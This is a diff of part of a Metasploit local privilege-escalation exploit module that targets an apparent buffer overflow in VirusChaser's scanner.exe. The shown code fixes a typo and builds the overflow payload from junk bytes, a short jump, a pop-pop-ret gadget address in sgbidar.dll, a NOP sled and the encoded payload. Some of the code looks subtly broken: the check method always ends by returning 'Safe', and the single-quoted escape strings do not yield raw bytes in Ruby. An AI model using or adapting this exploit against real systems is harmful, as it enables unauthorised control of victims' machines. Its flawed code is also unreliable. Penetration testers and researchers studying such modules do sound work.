@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Exploit::Local
 
   def check
     vprint_status('Checking if target is a Windows system.')
-    Exploit::CheckCode::Safe if client.platform != 'windows' || (client.arch != ARCH_X64 && client.argh != ARCH_X86)
+    Exploit::CheckCode::Safe if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
     
     vprint_status('Checking privileges')
     if is_system?
@@ -59,12 +59,11 @@ class MetasploitModule < Msf::Exploit::Local
     Exploit::CheckCode::Appears if exist?('C:\\Program Files\\VirusChaser\\scanner.exe')
 
     Exploit::CheckCode::Safe
-    
   end
 
   def payload_complete
-    buf = 'A'*688
-    jmp = '\xeb\x0b\x41\x41'      # JMP 0B
+    buf = 'A'*688                  # Junk to trigger the overflow
+    jmp = '\xeb\x0b\x41\x41'       # JMP 0B
     ret = [0x10010c81].pack('L<')  # pop ECX #pop ESI #RET [sgbidar.dll]
     nop = '\x90'*24
     payload_full = buf + jmp + ret + nop + payload.encoded
